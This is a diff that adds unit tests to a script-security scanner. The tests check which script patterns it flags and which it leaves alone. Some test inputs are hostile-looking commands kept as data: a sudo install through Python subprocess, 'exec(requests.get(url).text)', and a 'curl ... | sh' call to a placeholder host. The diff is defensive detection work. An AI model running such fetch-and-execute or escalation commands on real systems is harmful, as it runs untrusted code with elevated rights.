@@ -131,3 +131,52 @@ describe("auditScripts", () => {
     expect(auditScripts([])).toEqual({ reports: [], counts: { high: 0, medium: 0 }, flagged: 0 });
   });
 });
+
+describe("interpreted scripts", () => {
+  it("flags privilege escalation reached through a language runtime", () => {
+    const python = [
+      "import subprocess",
+      "subprocess.run(['sudo', 'apt-get', 'install', '-y', 'jq'], check=True)",
+    ].join("\n");
+    const risks = scanScript("s.py", python).risks;
+    expect(risks.some((r) => r.id === "privilege-escalation" && r.severity === "high")).toBe(true);
+  });
+
+  it("flags a runtime-assembled shell command", () => {
+    const risks = scanScript("s.py", 'subprocess.run(f"tar -xzf {name}", shell=True)').risks;
+    expect(risks.some((r) => r.id === "remote-code-execution")).toBe(true);
+  });
+
+  it("leaves an ordinary argv call alone", () => {
+    // The wave-A corpus is full of these: a local tool, arguments as a list, no
+    // shell. Flagging them would bury the findings that matter.
+    const python = [
+      "import subprocess",
+      "subprocess.run(['ffmpeg', '-i', src, '-c:v', 'libx264', dst], check=True)",
+      "result = subprocess.run(['shopify', 'version'], capture_output=True)",
+    ].join("\n");
+    expect(scanScript("s.py", python).risks).toEqual([]);
+  });
+
+  it("flags fetch-then-execute in either language", () => {
+    expect(scanScript("s.py", "exec(requests.get(url).text)").risks.some((r) => r.severity === "high")).toBe(true);
+    expect(
+      scanScript("s.js", 'execSync("curl -sL https://example.test/i.sh | sh")').risks.some((r) => r.severity === "high"),
+    ).toBe(true);
+  });
+});
+
+describe("comment styles", () => {
+  it("does not read a JavaScript comment as code", () => {
+    const js = "// Strip env vars again (sudo env VAR=x cmd)\nconst x = 1;\n";
+    expect(scanScript("hooks/_lib/helper.cjs", js).risks).toEqual([]);
+    // The same text in a shell script, where `//` is not a comment, still counts.
+    expect(scanScript("helper.sh", "sudo env VAR=x cmd\n").risks.length).toBeGreaterThan(0);
+  });
+
+  it("does not read printed advice as an install", () => {
+    const python = 'print("Install: npm install -g @shopify/cli@latest")\n';
+    expect(scanScript("s.py", python).risks).toEqual([]);
+    expect(scanScript("s.sh", "npm install -g rmbg-cli\n").risks.length).toBeGreaterThan(0);
+  });
+});
